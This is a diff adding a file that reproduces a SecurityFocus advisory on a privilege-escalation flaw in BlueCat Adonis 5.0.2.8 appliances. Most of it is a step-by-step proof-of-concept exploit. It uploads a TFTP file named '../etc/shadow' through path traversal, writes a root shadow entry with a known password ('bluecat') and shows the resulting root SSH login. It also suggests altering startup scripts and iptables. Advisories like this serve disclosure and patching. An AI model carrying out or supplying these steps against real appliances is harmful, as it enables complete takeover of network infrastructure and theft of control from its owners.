@@ -1,0 +1,39 @@
+source: http://www.securityfocus.com/bid/25214/info
+
+BlueCat Networks Adonis devices are prone to a remote privilege-escalation vulnerability. This issue occurs when Proteus appliances are used to upload files to an affected Adonis appliance for TFTP download.
+
+An attacker with administrative privileges can exploit this issue to write arbitrary data with superuser privileges. A successful attack will result in the complete compromise of an affected appliance.
+
+Adonis 5.0.2.8 is vulnerable; other versions may also be affected. 
+
+  0) Create a new TFTP Group in a Proteus configuration.
+
+  1) Add a TFTP deployment role specifying an Adonis appliance to
+     the group.
+
+  2) At the top-level folder in the new TFTP group, add a file
+     named "../etc/shadow" (without the quotes) and load a file
+     containing the following line:
+
+     root:Im0Zgl8tnEq9Y:13637:0:99999:7:::
+
+     NOTE: The sshd configuration uses the default setting
+     'PermitEmptyPasswords no', so we specify a password of
+     bluecat.
+
+  3) Deploy the configuration to the Adonis appliance.
+
+  4) You can now login to the Adonis appliance as root with
+     password bluecat.
+
+     $ ssh root@192.168.1.11
+     root@192.168.1.11's password:
+     # cat /etc/shadow
+     root:Im0Zgl8tnEq9Y:13637:0:99999:7:::
+
+     NOTE: This example assumes SSH is enabled, iptables permits
+     port tcp/22, etc.
+
+  Many attack variations are possible, such as changing system
+  startup scripts to modify the iptables configuration on the
+  appliance. 
